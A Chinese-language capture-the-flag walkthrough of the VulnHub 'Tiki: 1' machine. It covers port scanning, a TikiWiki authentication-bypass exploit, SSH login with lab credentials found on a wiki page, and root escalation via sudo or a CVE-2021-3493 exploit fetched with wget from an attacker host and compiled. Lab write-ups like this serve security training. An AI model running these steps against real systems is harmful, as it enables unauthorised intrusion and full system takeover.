CMS漏洞, vulnhub, 信息收集, 内核漏洞, 综合

该靶机比较简单。

1. 靶机信息

靶机地址：

  • Tiki: 1 ~ VulnHub

难度：

  • 简单

目标：

  • 拿到root权限
  • 拿到1个flag

2. 信息收集

2.1. 端口信息

1. sudo arp-scan -l
2. sudo nmap -p- 10.0.2.48
3. sudo nmap -p22,80,139,445 -A 10.0.2.48

2.2. 网页信息

首先根据扫描结果，存在robots.txt，里面有一个新的目录 /tiki，然后再次访问该目录，发现来到了一个页面

左上角告诉我们，这个页面的CMS是tikiwiki，搜索一下发现存在许多可利用的漏洞，但是我们现在还不直到版本信息，接下来进行路径扫描，在/tiki/README中找到了版本信息

接下来搜索对应版本的是否存在漏洞可以利用

正好有一个身份认证绕过的漏洞

3. get shell

直接使用该漏洞，只需要指定ip即可 

python3 48927.py 10.0.2.48

根据结果，admin的密码已经被溢出，接下我们使用空密码就可以登录。但是，页面不允许直接使用空密码登录

因此，使用burp抓包放过

成功进入后台

在后台测试功能点的时候，发现虽然存在文件上传（如下），但是无法利用，因为无法访问上传的文件

又继续收集信息，在 Wiki -> List Pages 发现了一个

红框文件里面的内容像是认证信息： 

silky:Agy8Y7SPJNXQzqA

想到端口信息扫描的时候发现开放了22 ssh，尝试登录，成功！

保险起见，我把另外两个文件也看了，内容为：(第三个文件就是网页的首界面) 

# Hi my Name is Silky

This is my third CTF. Dont give up, there is always a way to **root**!

I like Cats, Frogs, Snakes and cute Doggos but thats not helpful isnt it?  
Hmmm maybe you like something different, ... You like Hacking right?  
I got a new CVE Number: But I constantly forget its ID :/

看这个像是提示，需要使用CVE去提权到root

4. 权限提升

4.1. 方法1

超简单，我查看了sudo -l 发现silky用户居然可以以root权限执行所有命令

那么，接下来直接切换到root即可 

sudo su

4.2. 方法2

根据提示可能需要使用某个CVE，因此将 linux-exploit-suggester.sh 传入到靶机，但是结果很遗憾，并没有任何可用的CVE

但是发现靶机的系统是Ubuntu的，而Ubuntu有一个接近万能的CVE，那就是CVE-2021-3493。使用下面的命令查看靶机是否存在gcc 

which gcc

因此，将漏洞利用代码传入到靶机，编译并执行即可提权到root： 

1. wget http://10.0.2.4:8090/exploit.c
2. gcc exploit.c -o exp
3. chmod +x exp
4. ./exp

成功提权到root。最后进行收尾工作，读取/root目录下的flag.txt
